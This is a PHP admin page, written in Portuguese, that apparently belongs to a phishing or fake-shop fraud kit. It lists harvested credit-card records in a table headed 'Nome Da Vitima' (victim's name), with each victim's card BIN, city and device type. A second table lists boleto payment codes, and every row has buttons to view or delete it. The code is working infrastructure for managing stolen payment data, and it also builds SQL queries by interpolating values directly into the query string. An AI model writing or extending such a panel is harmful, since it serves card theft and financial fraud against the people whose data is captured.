<?php include('cabecalho.php');
include('../conexao.php');
// Pega os numeros de info
$querycc = "SELECT * FROM `informacoes` WHERE metodo = \"Cartão\"";
$resultadocc = mysqli_query($conexao, $querycc);
$queryleto = "SELECT * FROM `informacoes` WHERE metodo = \"Boleto\"";
$resultadoleto = mysqli_query($conexao, $queryleto);
$numerocc = mysqli_num_rows($resultadocc);
$numeroleto = mysqli_num_rows($resultadoleto);

if(isset($_GET['excluido'])) {
    echo '<div class="alert alert-danger">Excluido com Sucesso!</div>';
};
?>
<div class="container-fluid">

    <div class="col-md-12">
        <div class="card">
            <div class="card-header bg-light"><ul class="nav nav-tabs" role="tablist">
                    <li class="nav-item active">
                        <a class="nav-link" data-toggle="tab" href="#infocc" role="tab" aria-controls="home" aria-expanded="false" aria-selected="false"><i class="icon-credit-card"></i> Cartões De Credito &nbsp;<span class="badge badge-success"><?=$numerocc?></span></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" data-toggle="tab" href="#leto" role="tab" aria-controls="profile" aria-expanded="true" aria-selected="false"><i class="icon-docs"></i> Boletos Bancario &nbsp;<span class="badge badge-success"><?=$numeroleto?></span></a>
                    </li>

                </ul></div>
            <div class="card-body">
                    <div class="tab-content">
                        <div class="tab-pane active" id="infocc" role="tabpanel" aria-expanded="false">
                            <table class="table table-bordered">
                                <thead>
                                <tr>
                                    <th width="5%">Disp</th>
                                    <th width="30%">Nome Da Vitima</th>
                                    <th width="10%">Bin</th>
                                    <th width="35%">Cidade Da Vitima</th>
                                    <th width="15%">Ações</th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php
                                while($exibe = mysqli_fetch_assoc($resultadocc)){
                                    $queryproduto = "select * from produtos where id = {$exibe['idproduto']}";
                                    $resultadoproduto = mysqli_query($conexao, $queryproduto);
                                    while($produto = mysqli_fetch_assoc($resultadoproduto)){
                                        $nome = $produto['nome'];
                                    }
                                    ?>
                                    <tr>
                                        <td><?php
                                                if($exibe['dist'] == 'mobile'){
                                                    echo '<center><i class="fa fa-mobile" aria-hidden="true"></i></center>';
                                                }else{
                                                    echo '<center><i class="fa fa-desktop" aria-hidden="true"></i></center>';
                                                };
                                            ?></td>
                                        <td><?=substr($exibe['nomecompleto'], 0, 35)?></td>
                                        <td><?=substr($exibe['numerocc'], 0, 6)?></td>
                                        <td><?=substr($exibe['cidade'], 0, 35)?></td>
                                        <td align="center">
                                                <a href="excluirinfo.php?id=<?=$exibe['id']?>" class="btn btn-rounded btn-danger" alt="Excluir"><ion-icon name="trash"></ion-icon></a>
                                                <a href="visualisarinfo.php?id=<?=$exibe['id']?>" class="btn btn-rounded btn-primary"><ion-icon name="eye"></ion-icon></a>
                                    </tr>
                                <?php  }; ?>
                                </tbody>
                            </table>
                        </div>

                        <div class="tab-pane" id="leto" role="tabpanel" aria-expanded="true">
                            <table class="table table-bordered">
                                <thead>
                                <tr>
                                    <th width="5%">Disp</th>
                                    <th width="50%">Codigo Boleto</th>
                                    <th width="30%">Produto</th>
                                    <th width="15%">Ações</th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php
                                while($exibe = mysqli_fetch_assoc($resultadoleto)){
                                    $queryproduto = "select * from produtos where id = {$exibe['idproduto']}";
                                    $resultadoproduto = mysqli_query($conexao, $queryproduto);
                                    while($produto = mysqli_fetch_assoc($resultadoproduto)){
                                        $nome = $produto['nome'];
                                    }
                                    ?>
                                    <tr>
                                        <td><?php
                                            if($exibe['dist'] == 'mobile'){
                                                echo '<center><i class="fa fa-mobile" aria-hidden="true"></i></center>';
                                            }else{
                                                echo '<center><i class="fa fa-desktop" aria-hidden="true"></i></center>';
                                            };
                                            ?></td>
                                        <td><?=$exibe['codigoboleto']?></td>
                                        <td><?=substr($nome, 0, 25)?></td>
                                        <td align="center">
                                            <a href="excluirinfo.php?id=<?=$exibe['id']?>" class="btn btn-rounded btn-danger" alt="Excluir"><ion-icon name="trash"></ion-icon></a>
                                            <a href="visualisarleto.php?id=<?=$exibe['id']?>" class="btn btn-rounded btn-primary"><ion-icon name="eye"></ion-icon></a>
                                    </tr>
                                <?php  }; ?>
                                </tbody>
                            </table>
                        </div>

                    </div>
            </div>
        </div>
    </div>

</div>
<?php include('rodape.php'); ?>
